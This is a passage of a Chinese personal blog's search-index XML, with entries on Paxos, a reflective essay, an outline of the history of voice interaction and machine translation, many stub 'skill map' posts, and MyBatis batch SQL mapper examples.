也就是说在最初的第二阶段，议题是先入为主的，谁先占了先机，后面的proposer在第一阶段就会学习到这个议题而修改自己本身的议题， 因为这样没职业操守，才能让一致性得到保证，这就是paxos算法的一个过程。 原来paxos算法里的角色都是这样的不靠谱，不过没关系，结果靠谱就可以了。该算法就是为了追求结果的一致性。 两阶段提交解决分布式事务 有瑕疵 还有个三阶段提交 2pc、3pc概念 以后再整理 一致性hash：https://www.cnblogs.com/lpfuture/p/5796398.html]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随便写点]]></title>
    <url>%2F2017%2F07%2F06%2Fessay%2Fessay-1%2F</url>
    <content type="text"><![CDATA[做人、莫为了钱背信弃义做事、一定要有自己的判断感情、去了就去了、别纠缠不清过往、平淡如水人这一辈子、总会有许多错误、 在你迷茫不知前路的年纪、总会犯下许许多多的错误、 当你的人生回归正道的时候、也需要为你犯下的错误而偿还代价 错过的人、错过的事、错误的选择、 弯路也是路、认清现在的自己、看清楚未来的自己、才会丢掉迷失的自己、不后悔、 我不能改变我以前做的错事、但可以以此为鉴、在今后的生活中、选择正确的、 谁的人生没有痛苦、想想这些、就算了吧、会更好的、一切都会更好的 引子 山不在高、有仙则灵 水不在深、有龙则灵 世事无相、相由心生 可见之物、实为非物 可感之事、实为非事 物事皆空、空为心瘴 俗人之心、处处皆狱 唯有化世、堪为无我 我即为世、世即为我 道可道.非常道.名可名.非常名 人生就像一壶酒。有苦有辣有辛酸。有梦有泪有遗憾。 没钱的人是苦涩的一生。有钱的人是短暂的一生。 有时候越想没有遗憾，遗憾越多。 人生郁郁不得意的时候，往往回忆最美。 别跟你女朋友讲多喝点热水，请认真的去关爱这个能陪伴你一生的人。 人的一生，二十岁往后就会失陷，名.利.权. 请多花点心思在爱你的人身上，别在最后的时间里，遗憾一生。 别累垮了自己，什么情况下请关心自己，大家都会理解。 每个百毒不侵的人，都曾被深深的伤害过。 当心爱的人离开，你才明白没有人能陪你走到永远。 当时间消磨掉了你的热情，你便会发现，那些曾令你歇斯底里的去执著的人，现已变得可有可无。 描述卡耐基的一段话12345678910111213我从未看到过有人像他这般富有想象力、无穷的智慧以及透彻的理解力、他能读懂你的思想，并把你的一切行为和思想都储存到他的脑海中、你尚未开口，他似乎已经知道你要说什么，他思维敏捷，而且他还有一种深入观察的习惯，这使得他能了解每一件事。但他最杰出的天赋才能是具有激烈他人的能力、他身上总散发着一种自信。若你对某些事情有些疑惑，可以可卡耐基先生讨论，他会立刻使你明白你自己的想法是正确的并使你绝对相信你自己的想法，甚至他也会指出其中的弱点，从而消除你的疑惑、这种吸引人、鼓舞人的个性来自于他的自信。他的领导成就是有目共睹的。我想、在企业史上、除了他之外，再也难以找到一个像他这样的人、对自己的企业细节一无所知、而且本人丝毫不懂钢铁或者工程技术、但却建立起了一个如此庞大的企业王国。 题外箴言 能力就是有组织地努力、 这一能力包括你的教育程度、你的才智、你的承受力、你的性格、以及你的品格。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI 人机交互发展史]]></title>
    <url>%2F2017%2F07%2F04%2Fai%2Fai-001%2F</url>
    <content type="text"><![CDATA[起源发展人机交互发展历程 PC时代 键盘+鼠标 移动互联网时代 多点触摸、手写、手势、siri语音交互 android ios 智能生活时代 语音交互发展路径 具备语音能力的app 实体语音按键 无需按键语音唤醒 远场全双工无需重复唤醒 【讯飞AIUI】 多模态交互机器人 语音交互痛点 语音识别不准 环境嘈杂、离得远、方言口音 垂直领域术语、个性化词汇 语义理解不对 上下文关联、场景相关 实体取名复杂 垂直领域实体歧义 口语化、尝试北京、省略说法 信息内容不足 即时性 可用性 授权 系统响应单一 机器反馈方式缺少变化 缺少通用对话管理策略 机器翻译技术发展史 基于规则的机器翻译 IBM提出的基于词的统计翻译模型 Koehn提出基于短语的统计翻译模型 谷歌和蒙特利尔大学提出端到端神经机器翻译 蒙特利尔大学引入Attention机制、解决场景翻译难点 谷歌发布 transformer系统 三大技术路线 规则机器翻译 openLogos--开源、 三个技术路线：直接翻译、借助词典；句法树翻译、借助词典；中间语言来翻译 优点 保持原文结构 对于语言现象已知或者结构规范的源语言效果较好 缺点 人工编写、工作量大 主观性强、一致性难以保障 不利于系统扩充 无法解决不规范语言翻译 统计机器翻译 神经机器翻译]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运维 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-maintenance%2F</url>
    <content type="text"><![CDATA[收集到的 运维 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-big-data%2F</url>
    <content type="text"><![CDATA[收集到的 大数据 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-container%2F</url>
    <content type="text"><![CDATA[收集到的 容器 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-devops%2F</url>
    <content type="text"><![CDATA[收集到的 DevOps 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-design-model-1%2F</url>
    <content type="text"><![CDATA[收集到的 设计模式 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嵌入式 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-embedded%2F</url>
    <content type="text"><![CDATA[收集到的 嵌入式 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-hadoop%2F</url>
    <content type="text"><![CDATA[收集到的 hadoop 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java list 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-list%2F</url>
    <content type="text"><![CDATA[收集到的 java list 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 集合 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-collection%2F</url>
    <content type="text"><![CDATA[收集到的 java 集合 图谱收集到的 java 集合 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java map 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-map%2F</url>
    <content type="text"><![CDATA[收集到的 java map 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[互联网大流量的方法图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-Internet-traffic%2F</url>
    <content type="text"><![CDATA[收集到的 互联网大流量的方法 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java set 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-set%2F</url>
    <content type="text"><![CDATA[收集到的 java set 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里巴巴常用小框架图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-alibaba-software-0%2F</url>
    <content type="text"><![CDATA[收集到的 阿里巴巴常用小框架 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOS图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-ios%2F</url>
    <content type="text"><![CDATA[收集到的 IOS 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm 垃圾回收 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-jvm-garbage%2F</url>
    <content type="text"><![CDATA[收集到的 jvm 垃圾回收 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenResty 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-openresty%2F</url>
    <content type="text"><![CDATA[收集到的 OpenResty 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-microservice%2F</url>
    <content type="text"><![CDATA[收集到的 微服务 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全秘籍图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-security%2F</url>
    <content type="text"><![CDATA[收集到的 安全秘籍 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件工程 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-software%2F</url>
    <content type="text"><![CDATA[收集到的 软件工程 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发语言宝典 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-voice%2F</url>
    <content type="text"><![CDATA[收集到的 开发语言宝典 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件发布 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-release%2F</url>
    <content type="text"><![CDATA[收集到的 软件发布 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端技能 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-web%2F</url>
    <content type="text"><![CDATA[收集到的 前端技能 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端测试 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-app-test%2F</url>
    <content type="text"><![CDATA[收集到的 移动端测试 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-architecture-0%2F</url>
    <content type="text"><![CDATA[收集到的 架构师 图谱收集到的 架构师 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 并发 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-concurrent%2F</url>
    <content type="text"><![CDATA[收集到的 java 并发 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师方法论图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-architecture-1%2F</url>
    <content type="text"><![CDATA[收集到的 架构师方法论 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一致性图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-consistency%2F</url>
    <content type="text"><![CDATA[收集到的 一致性 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云计算 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-cloud-computing%2F</url>
    <content type="text"><![CDATA[收集到的 云计算 图谱收集到的 云计算 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>各行业技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mybatis实例]]></title>
    <url>%2F2017%2F03%2F24%2Fmysql%2Fmybatis-example%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819&lt;!-- 批量插入 遇到重复key 改为更新 需求设定--&gt; &lt;insert id=&quot;addBatchDepartment&quot; parameterType=&quot;java.util.List&quot; &gt; INSERT INTO department ( branchId, branchName, common, spellId) VALUES &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;,&quot; &gt; ( #&#123;item.branchId&#125;, #&#123;item.branchName&#125;, #&#123;item.common&#125;, #&#123;item.spellId&#125; ) &lt;/foreach&gt; ON DUPLICATE KEY UPDATE branchId = values(branchId) &lt;/insert&gt; 增 12345678910&lt;insert id=&quot;addStudent&quot; parameterType=&quot;java.util.Map&quot;&gt;insert into student(id,name,age)values( #&#123;item.id&#125;, #&#123;item.name&#125;, #&#123;item.age&#125;)&lt;/insert&gt; 批量 12345678910111213&lt;insert id=&quot;addStudent&quot; parameterType=&quot;java.util.Map&quot;&gt;insert into student(id,name,age,start_time)values &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;,&quot;&gt;( #&#123;item.id&#125;, #&#123;item.name&#125;, #&#123;item.age&#125;, now())&lt;/foreach&gt; &lt;/insert&gt; 删 1这里写代码片 批量 改 123456789101112&lt;update id=&quot;updateStudent&quot; parameterType=&quot;java.util.Map&quot;&gt; update student &lt;set&gt; &lt;if test=&quot;userid != null and userid != &apos;&apos; &quot;&gt; userid=#&#123;userid&#125;, &lt;/if&gt; &lt;/set&gt; where 1=1&lt;if test=&quot;id!= null and id!= &apos;&apos; &quot;&gt; and id=#&#123;id&#125;&lt;/if&gt; &lt;/update&gt; 批量 12345678&lt;update id=&quot;updateStudent&quot; parameterType=&quot;java.util.Map&quot;&gt; update student set state=2 where 1=1 and id in &lt;foreach item=&quot;item&quot; index=&quot;index&quot; collection=&quot;list&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; &lt;/update&gt; 1234567891011121314&lt;update id=&quot;editStudent&quot; parameterType=&quot;java.util.List&quot;&gt; &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;;&quot;&gt; update ware_service &lt;set&gt; &lt;if test=&quot;item.endTime!=null and item.endTime!=&apos;&apos;&quot;&gt; end_time=#&#123;item.endTime&#125;, &lt;/if&gt; &lt;if test=&quot;item.redeemcode!=null and item.redeemcode!=&apos;&apos;&quot;&gt; redeemcode=#&#123;item.redeemcode&#125; &lt;/if&gt; &lt;/set&gt; where id=#&#123;item.id&#125; &lt;/foreach&gt; &lt;/update&gt; 批量修改需设置db.properties新增 &amp;allowMultiQueries=true 查 123456789101112 &lt;select id=&quot;getAllStudent&quot; resultType=com.mofangge.entity.student&quot; parameterType=&quot;java.util.Map&quot;&gt; selectid,name,age,start_time as startTimefrom student where 1=1 &lt;if test=&quot;userid != null and userid != &apos;&apos; &quot;&gt; and userid=#&#123;userid&#125; &lt;/if&gt;and end_time &gt; now() &lt;/select&gt; 批量 123456789101112131415&lt;select id=&quot;getAllStudents&quot; resultType=&quot;com.mofangge.entity.student&quot; parameterType=&quot;java.util.Map&quot;&gt; select id, name, age, start_time as startTime from student where 1=1 and age in &lt;foreach collection=&quot;list&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; and end_time &gt; now() &lt;if test=&quot;userid!=null and userid!=&apos;&apos;&quot;&gt; and userid=#&#123;userid&#125; &lt;/if&gt; &lt;/select&gt; 1234567891011121314&lt;select id=&quot;getAllStudent&quot; resultType=&quot;com.mofangge.entity.Student&quot; parameterType=&quot;java.util.Map&quot;&gt; select id, name, age, from student where 1=1 and code in &lt;foreach collection=&quot;list&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; and end_time &gt; now() &lt;if test=&quot;id!=null and id!=&apos;&apos;&quot;&gt; and id=#&#123;id&#125; &lt;/if&gt; &lt;/select&gt; mybatis大于小于写法123456789101112原符号 &lt; &lt;= &gt; &gt;= &amp; &apos; &quot;替换符号 &amp;lt; &amp;lt;= &amp;gt; &amp;gt;= &amp;amp; &amp;apos; &amp;quot;例如：sql如下：create_date_time &amp;gt;= #&#123;startTime&#125; and create_date_time &amp;lt;= #&#123;endTime&#125;第二种写法（2）：大于等于&lt;![CDATA[ &gt;= ]]&gt;小于等于&lt;![CDATA[ &lt;= ]]&gt;例如：sql如下：create_date_time &lt;![CDATA[ &gt;= ]]&gt; #&#123;startTime&#125; and create_date_time &lt;![CDATA[ &lt;= ]]&gt; #&#123;endTime&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
      </tags>
  </entry>
</search>
